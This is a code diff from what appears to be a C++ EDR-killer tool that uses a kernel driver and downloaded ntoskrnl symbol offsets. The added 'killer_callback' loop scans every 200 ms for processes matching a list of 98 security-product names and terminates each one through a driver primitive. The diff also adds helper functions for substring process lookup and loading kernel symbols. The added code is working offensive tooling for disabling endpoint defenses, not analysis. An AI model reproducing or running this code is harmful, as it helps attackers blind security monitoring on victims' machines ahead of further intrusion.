@@ -5,14 +5,19 @@
 extern EZPDB pdb;
 extern ULONG_PTR ntoskrnlBase;
 extern const char* monitoredDrivers[];
+extern int stop_term;
+extern HANDLE termDevice;
+extern const char* g_edrlist[];
 
 EZPDB loadKernelOffsets() {
     std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
+	
+	//std::string kernel = std::string("C:\\Windows\\System32\\ntoskrnl.exe");
     std::string pdbPath = EzPdbDownload(kernel);
 
     if (pdbPath.empty())
     {
-        std::cout << "download pdb failed " << GetLastError() << std::endl;;
+        std::cout << "download pdb failed " << GetLastError() << std::endl;
     }
 
     EZPDB pdb;
@@ -24,6 +29,24 @@ EZPDB loadKernelOffsets() {
 
     return pdb;
 }
+
+EZPDB loadKernelOffsetsWithPath(std::string pdbPath) {
+
+	if (pdbPath.empty())
+	{
+		std::cout << "download pdb failed " << GetLastError() << std::endl;
+	}
+
+	EZPDB pdb;
+	if (!EzPdbLoad(pdbPath, &pdb))
+	{
+		std::cout << "load pdb failed " << GetLastError() << std::endl;
+	}
+
+
+	return pdb;
+}
+
 
 
 ULONG_PTR GetKernelBaseAddress() {
@@ -142,6 +165,40 @@ DWORD64 FindProcessId(const char* processName) {
 		if (Process32First(snapshot, &processEntry)) {
 			do {
 				if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
+					processId = processEntry.th32ProcessID;
+					break;
+				}
+			} while (Process32Next(snapshot, &processEntry));
+		}
+		CloseHandle(snapshot);
+	}
+
+	free(wprocessName);
+	return processId;
+}
+
+DWORD64 FindProcessIdcontain(const char* processName) {
+
+	// Convert process name to wide char for comparison
+	size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
+	wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
+	if (!wprocessName) {
+		return 0;
+	}
+	mbstowcs(wprocessName, processName, wcharCount);
+
+	DWORD64 processId = 0;
+
+	// Take a snapshot of all running processes
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot != INVALID_HANDLE_VALUE) {
+		PROCESSENTRY32 processEntry;
+		processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+		// Iterate through all processes to find a match
+		if (Process32First(snapshot, &processEntry)) {
+			do {
+				if (StrStrIW(processEntry.szExeFile, wprocessName) != NULL) {
 					processId = processEntry.th32ProcessID;
 					break;
 				}
@@ -844,4 +901,22 @@ VOID disableWTI(HANDLE hDevice) {
 
 VOID terminateProcess(HANDLE hDevice, DWORD pid) {
 	terminatePrimitive(hDevice, pid);
+}
+
+
+VOID killer_callback(LPVOID lpParam) {
+	HANDLE hDevice = (HANDLE)lpParam;
+	int edrCount = 98;
+
+	while (!stop_term) {
+		for (size_t i = 0; i < edrCount; i++) {
+			DWORD pid = FindProcessIdcontain(g_edrlist[i]);
+			if (pid) {
+				printf("Terminating: %s with pid %d\n", g_edrlist[i], pid);
+				terminateProcess(hDevice, pid);
+			}
+
+		}
+		Sleep(200);
+	}
 }
